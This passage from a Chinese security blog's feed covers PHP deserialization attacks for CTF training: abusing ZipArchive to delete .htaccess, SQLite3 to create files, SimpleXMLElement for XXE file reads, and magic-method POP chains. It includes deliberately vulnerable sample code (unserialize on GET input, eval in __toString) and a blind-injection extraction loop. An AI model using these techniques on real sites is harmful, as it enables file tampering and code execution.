class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">127</span>,<span class="number">31</span>, <span class="number">-1</span>):</span><br><span class="line">        print(<span class="string">"flag &#123;&#125; &#123;&#125;"</span>.format(i, j))</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        exp = base.format(cat_flag, i, j)</span><br><span class="line">        <span class="keyword">if</span> test(exp):</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">32</span>:</span><br><span class="line">        flag += <span class="string">'?'</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本坑开的好久了= =，但一直太忙了，现在已经是7月了，都想不起来还有啥题了，只把坑先填上了~&lt;/p&gt;
&lt;h2 id=&quot;nextphp&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Summary of serialization attacks &amp; Part 2</title>
    <link href="http://skysec.top/2019/05/05/Summary-of-serialization-attacks-Part-2/"/>
    <id>http://skysec.top/2019/05/05/Summary-of-serialization-attacks-Part-2/</id>
    <published>2019-05-05T13:37:31.000Z</published>
    <updated>2019-05-27T23:56:24.124Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前写了一篇介绍序列化概念和两种常见攻击：1.魔法方法，2.session序列化引擎。<br>本篇文章继续深入，介绍另外方法：原生类序列化问题。</p><h2 id="原生类同名函数"><a href="#原生类同名函数" class="headerlink" title="原生类同名函数"></a>原生类同名函数</h2><h3 id="问题引入"><a href="#问题引入" class="headerlink" title="问题引入"></a>问题引入</h3><p>什么是原生类同名函数攻击漏洞呢？我们不妨看如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UploadFile</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($fakename, $content)</span> </span>&#123;</span><br><span class="line">        ..... <span class="comment">// 你什么也不能做</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($fakename, $realname)</span> </span>&#123;</span><br><span class="line">        ..... <span class="comment">// 你什么也不能做</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>假设有这样一个上传类，但是因为有.htaccess文件的控制，上传文件夹被限制的很死，我们很难上传我们的一句话文件。唯一的突破口是利用类中的函数或者漏洞，删除.htaccess文件，否则即便上传了一句话文件，也不能被解析。</p><h3 id="问题探索"><a href="#问题探索" class="headerlink" title="问题探索"></a>问题探索</h3><p>但是纵观类中函数，没有一个具有删除或者覆盖功能，此时应该如何操作呢？此时便应该考虑一下是否有原生类具有同名函数。比如此处的open函数，我们可以通过php代码进行搜索：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">foreach</span> (get_declared_classes() <span class="keyword">as</span> $class) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (get_class_methods($class) <span class="keyword">as</span> $method) &#123;</span><br><span class="line">      <span class="keyword">if</span> ($method == <span class="string">"open"</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$class-&gt;$method\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>不难得到如下结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQLite3-&gt;open</span><br><span class="line">SessionHandler-&gt;open</span><br><span class="line">XMLReader-&gt;open</span><br><span class="line">ZipArchive-&gt;open</span><br></pre></td></tr></table></figure></p><p>发现有4个php原生类带有open方法，我们查阅每个方法的实现。</p><h3 id="方法实现探究"><a href="#方法实现探究" class="headerlink" title="方法实现探究"></a>方法实现探究</h3><p>对于SQLite3-&gt;open，我们查阅官方手册：<br><img src="/images/2019-05-06-11-27-06.png" alt=""><br>其有3个参数，看到模式SQLITE3_OPEN_READWRITE，应该不难想到是否可以篡改.htaccess，我们测试一下，得到报错：<br><img src="/images/2019-05-06-11-30-23.png" alt=""><br>显然这里的open方法并不能直接调用，我们继续往下看。<br>对于SessionHandler-&gt;open，我们查阅官方手册：<br><img src="/images/2019-05-06-11-31-48.png" alt=""><br>其有两个参数，一个是保存session的位置，一个是session的名字，很显然在这里不太适用，我们继续往下看。<br>对于XMLReader-&gt;open，我们查阅官方手册：<br><img src="/images/2019-05-06-11-33-18.png" alt=""><br>该方法也有3个参数，但显然也与删除文件没有太大关联，对我们的漏洞利用帮助不大，所以也可以直接跳过。<br>最后对于ZipArchive-&gt;open，我们查阅官方手册：<br><img src="/images/2019-05-06-10-37-16.png" alt=""><br>发现其参数为2个，前者是文件名，后者是选择模式，这里有一个overwrite非常引人注目，这正是我们需求的模式。我们跟进查看该模式描述：<br><img src="/images/2019-05-06-10-41-47.png" alt=""><br>本地测试一下：<br><img src="/images/2019-05-06-10-44-29.png" alt=""><br>发现使用该模式，可以成功删除指定文件。<br>那么如果目标操作序列化中，存在open调用，同时序列化可控，就有可能进行覆盖，达到删除指定文件的目的。例如题目中的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">open</span><span class="params">($fakename, $realname)</span> </span>&#123;</span><br><span class="line">       ..... <span class="comment">// 你什么也不能做</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p><p>我们可以让fakename为.htaccess，realname为ZipArchive::OVERWRITE，并控制序列化为ZipArchive对象，即可达成删除目的。<br>上述过程并非凭空想象出来的环境，在一次比赛中便用到了这样的方式，在比赛Insomnihack Teaser 2018中，File Vault一题的考察点便在于此。有兴趣的可以看这篇文章:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault</span><br></pre></td></tr></table></figure></p><h2 id="原生类魔法方法"><a href="#原生类魔法方法" class="headerlink" title="原生类魔法方法"></a>原生类魔法方法</h2><p>我们知道这种情况比较少数，因为需要程序去调用函数，并且其中同名的概率也是比较低的。所以不难联系到之前的魔法方法，这类方法可以在满足条件的情况下自动触发。如果我们能挖掘原生类中魔法方法的利用点，那么攻击范围肯定是明显大于上述这种需要调用的同名方法的。</p><h3 id="原生类探索"><a href="#原生类探索" class="headerlink" title="原生类探索"></a>原生类探索</h3><p>那么不妨列举出所有带有魔法方法的原生类：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">$classes = get_declared_classes();</span><br><span class="line"><span class="keyword">foreach</span> ($classes <span class="keyword">as</span> $class) &#123;</span><br><span class="line">    $methods = get_class_methods($class);</span><br><span class="line">    <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $method) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array($method, <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'__construct'</span>,</span><br><span class="line">            <span class="string">'__destruct'</span>,</span><br><span class="line">            <span class="string">'__toString'</span>,</span><br><span class="line">            <span class="string">'__wakeup'</span>,</span><br><span class="line">            <span class="string">'__call'</span>,</span><br><span class="line">            <span class="string">'__callStatic'</span>,</span><br><span class="line">            <span class="string">'__get'</span>,</span><br><span class="line">            <span class="string">'__set'</span>,</span><br><span class="line">            <span class="string">'__isset'</span>,</span><br><span class="line">            <span class="string">'__unset'</span>,</span><br><span class="line">            <span class="string">'__invoke'</span>,</span><br><span class="line">            <span class="string">'__set_state'</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> $class . <span class="string">'::'</span> . $method . <span class="string">"\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行后不难发现，这里就有前一篇文章我们说的原生类SoapClient魔法方法__call导致SSRF的问题：<br><img src="/images/2019-05-06-12-18-07.png" alt=""><br>当然这么多原生类中，肯定不止这一个魔法方法可以利用。</p><h3 id="SQLite3"><a href="#SQLite3" class="headerlink" title="SQLite3"></a>SQLite3</h3><p>例如原生类SQLite3，我们在遍历的时候，发现其存在魔法方法：SQLite3::__construct。<br>我们查阅一下官方手册：<br><img src="/images/2019-05-06-15-04-09.png" alt=""><br>此处可以发现，刚方法可以创建一个指定名称指定路径的空白文件：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$sky=<span class="keyword">new</span> SQLite3(<span class="string">'/tmp/sky/evil.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-06-15-06-27.png" alt=""><br>我们可以发现成功创建evil.php，可以有一个可控文件非常重要，我们可以用其存储数据，或是进行evil code的填写，方便后续攻击。</p><h3 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h3><p>又如原生类DirectoryIterator，我们注意到在遍历魔法方法时，其存在如下两个魔法方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DirectoryIterator::__construct</span><br><span class="line">DirectoryIterator::__toString</span><br></pre></td></tr></table></figure></p><p>我们查阅官方手册：<br><img src="/images/2019-05-06-15-13-04.png" alt=""><br><img src="/images/2019-05-06-15-13-17.png" alt=""><br>发现两者可以结合使用，首先使用魔法方法<strong>construct进行路径选择，再利用</strong>toString返回对应路径下的内容：<br><img src="/images/2019-05-06-15-15-18.png" alt=""><br>原理也很清晰，在使用echo的时候，触发了__toString魔法方法，返回了当前路径下的文件名。</p><h3 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h3><p>再如SimpleXMLElement，我们在遍历魔法方法的时候，也发现了其存在2种魔法方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SimpleXMLElement::__construct</span><br><span class="line">SimpleXMLElement::__toString</span><br></pre></td></tr></table></figure></p><p>我们同样去查阅官方手册：<br><img src="/images/2019-05-06-15-26-22.png" alt=""><br><img src="/images/2019-05-06-15-26-37.png" alt=""><br>这里相信大家都不陌生，看到xml肯定会想到xxe，这里也不例外，该原生类可以用来进行xxe任意文件读取。如下图：<br><img src="/images/2019-05-06-15-26-08.png" alt=""><br>在利用echo后会触发__toString()魔法方法，输出其中的值，但需要注意的是，这里需要options为LIBXML_NOENT，否则不会加载我们的实体：<br><img src="/images/2019-05-06-15-28-30.png" alt=""></p><h3 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h3><p>上述了多个原生类的利用点，实际上他们都来自于一场真实的案例，原文如下：<br><a href="https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html" target="_blank" rel="noopener">https://5haked.blogspot.com/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html</a><br>该牛串联多个原生类序列化问题，最后成功对某知名网站的任意代码执行，有兴趣的可以好好拜读一下~</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本篇文章是前一篇的进阶版，后续有机会将更加结合实际问题进行剖析，欢迎有骚操作的一起讨论！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;之前写了一篇介绍序列化概念和两种常见攻击：1.魔法方法，2.session序列化引擎。&lt;br&gt;本篇文章继续深入，介绍另外方法：原生类序列化问
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Summary of serialization attacks &amp; Part 1</title>
    <link href="http://skysec.top/2019/05/05/Summary%20of%20serialization%20attacks%20&amp;%20Part%201/"/>
    <id>http://skysec.top/2019/05/05/Summary of serialization attacks &amp; Part 1/</id>
    <published>2019-05-05T01:28:38.000Z</published>
    <updated>2019-06-24T12:01:00.185Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>近期因为内部培训有序列化的需求，于是趁此机会由浅入深的剖析一下序列化相关内容。<br>之前也写过由浅入深的xml漏洞系列，欢迎阅读：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2018/08/17/浅析xml及其安全问题/</span><br><span class="line">https://skysec.top/2018/08/18/浅析xml之xinclude-xslt/</span><br></pre></td></tr></table></figure></p><h2 id="序列化的概念"><a href="#序列化的概念" class="headerlink" title="序列化的概念"></a>序列化的概念</h2><p>简单概括来说，序列化即保存对象在内存中的状态，也可以说是实例化变量。在传递一个对象的时候，或是需要把对象保存在文件/数据库中时，就必须用序列化。</p><h2 id="序列化样例"><a href="#序列化样例" class="headerlink" title="序列化样例"></a>序列化样例</h2><p>以php官方手册样例为例：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SimpleClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 声明属性</span></span><br><span class="line">    <span class="keyword">public</span> $var = <span class="string">'a default value'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;var;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>这样一来我们写了一个简单的类样例，类中包含一个属性和一个方法。<br>我们可以通过如下方式对类的属性进行赋值，对类的方法进行调用：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sky = <span class="keyword">new</span> SimpleClass();</span><br><span class="line">$sky-&gt;var = <span class="string">'sky is cool!'</span>;</span><br><span class="line">$sky-&gt;displayVar();</span><br></pre></td></tr></table></figure></p><p>我们观察一下序列化后字符串的格式：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sky = serialize($sky);</span><br><span class="line">var_dump($sky);</span><br></pre></td></tr></table></figure></p><p>得到如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;SimpleClass&quot;:1:&#123;s:3:&quot;var&quot;;s:12:&quot;sky is cool!&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>O代表存储的是对象（object），11表示对象的名称有11个字符，”SimpleClass”表示对象的名称，1表示有一个值。<br>大括号内s表示字符串，3表示该字符串的长度，”var”为字符串的名称，紧跟着是该字符串的值，规则同理。<br>相同的，如果序列化数组，得到结果如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sky1 = <span class="keyword">new</span> SimpleClass();</span><br><span class="line">$sky1-&gt;var = <span class="string">'sky is cool!'</span>;</span><br><span class="line">$sky2 = <span class="keyword">new</span> SimpleClass();</span><br><span class="line">$sky2-&gt;var = <span class="string">'wq is cool!'</span>;</span><br><span class="line">$sky3 = <span class="keyword">new</span> SimpleClass();</span><br><span class="line">$sky3-&gt;var = <span class="string">'sy is cool!'</span>;</span><br><span class="line">$sky4 = <span class="keyword">array</span>($sky1,$sky2,$sky3);</span><br><span class="line">var_dump(serialize($sky4));</span><br></pre></td></tr></table></figure></p><p>得到如下内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3:&#123;i:0;O:11:&quot;SimpleClass&quot;:1:&#123;s:3:&quot;var&quot;;s:12:&quot;sky is cool!&quot;;&#125;i:1;O:11:&quot;SimpleClass&quot;:1:&#123;s:3:&quot;var&quot;;s:11:&quot;wq is cool!&quot;;&#125;i:2;O:11:&quot;SimpleClass&quot;:1:&#123;s:3:&quot;var&quot;;s:11:&quot;sy is cool!&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>与之前不同的，多了a和i，a表示数组，数字3表示数组中有3个元素，i:0表示第一个元素，i:1表示第二个元素，i:2表示第三个元素。其他规则与之前一致。<br>相应的，将这组字符串传递后，我们接受后，使用unserialize()进行反序列化，如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sky1 = <span class="string">'a:3:&#123;i:0;O:11:"SimpleClass":1:&#123;s:3:"var";s:12:"sky is cool!";&#125;i:1;O:11:"SimpleClass":1:&#123;s:3:"var";s:11:"wq is cool!";&#125;i:2;O:11:"SimpleClass":1:&#123;s:3:"var";s:11:"sy is cool!";&#125;&#125;'</span>;</span><br><span class="line">$sky2 = <span class="string">'O:11:"SimpleClass":1:&#123;s:3:"var";s:12:"sky is cool!";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($sky1));</span><br><span class="line">var_dump(unserialize($sky2));</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-05-05-09-56-53.png" alt=""><br>发现反序列化成功，我们已将之前存储的对象成功复原。</p><h2 id="魔法方法漏洞"><a href="#魔法方法漏洞" class="headerlink" title="魔法方法漏洞"></a>魔法方法漏洞</h2><h3 id="魔法方法样例"><a href="#魔法方法样例" class="headerlink" title="魔法方法样例"></a>魔法方法样例</h3><p>了解之前的原理后，我们首先看一个最简单的反序列化漏洞：<br><img src="/images/2019-05-05-10-01-44.png" alt=""><br>还是之前的代码，我们发现最后我们并没有进行方法调用，但成功触发了__toString()方法，这就是魔法方法的魅力。<br>魔法方法往往不需要用户调用，在特定条件下会自动触发，相关魔法方法在php官方手册中写的非常清楚了，就不再赘述：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.php.net/manual/zh/language.oop5.magic.php</span><br></pre></td></tr></table></figure></p><p>这里的<strong>toString方法之所以触发成功，是因为我们将对象当做字符串输出，符合</strong>toString方法的条件，所以成功触发了该方法。如果将echo换成var_dump则不会触发该方法。</p><h3 id="魔法方法实战（一）"><a href="#魔法方法实战（一）" class="headerlink" title="魔法方法实战（一）"></a>魔法方法实战（一）</h3><p>例如在Jarvis OJ上的一题:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32768</span><br></pre></td></tr></table></figure></p><p>index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">$x = unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $x-&gt;readfile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>shield.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in pctf.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们可以看到是一个非常简单的类，其中定义了1个属性和2个方法，其中便有魔法方法<strong>construct()，通过查阅官方手册我们知道：具有构造函数的类会在每次创建新对象时先调用此方法。所以刚方法在初始化的时候便会自动调用，那么这里要涉及一个先后顺序，是我们赋值先进行，还是</strong>construct()先进行，这里做一个简单测试：<br><img src="/images/2019-05-05-10-15-32.png" alt=""><br>从该测试不难看出，在new的时候__construct()已经出发，下一次赋值后即可将var属性覆盖。<br>回到题目中，在反序列化后，题目进行了如下调用<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> $x-&gt;readfile();</span><br></pre></td></tr></table></figure></p><p>而该方法有任意文件读取问题<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>所以答案也呼之欲出了，我们将file的值赋值为pctf.php即可getflag，需要注意的是我们的赋值是在魔法方法__construct()之后，所以并不会被置空。</p><h3 id="魔法方法实战（二）"><a href="#魔法方法实战（二）" class="headerlink" title="魔法方法实战（二）"></a>魔法方法实战（二）</h3><p>刚才的案例或许比较简单，我们在这样的基础上提高难度。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">       <span class="keyword">return</span> <span class="string">'1'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $c;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;c-&gt;no();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">'sky'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>我们观察到整个代码里有3个类，每个类里各一个属性，一个魔法方法。而最危险的函数为class A，其中有一步：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;a);</span><br></pre></td></tr></table></figure></p><p>如果想控制a的值是非常容易的，但是如何触发该方法是个问题，通过之前的案例，我们知道__toString()在对象被当做字符串输出的时候会自动触发，但程序的输入点中并没有echo等操作，所以直接对A进行序列化攻击是无效的。<br>那么我们寻找是否有将对象当做字符串输出的点：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>发现class 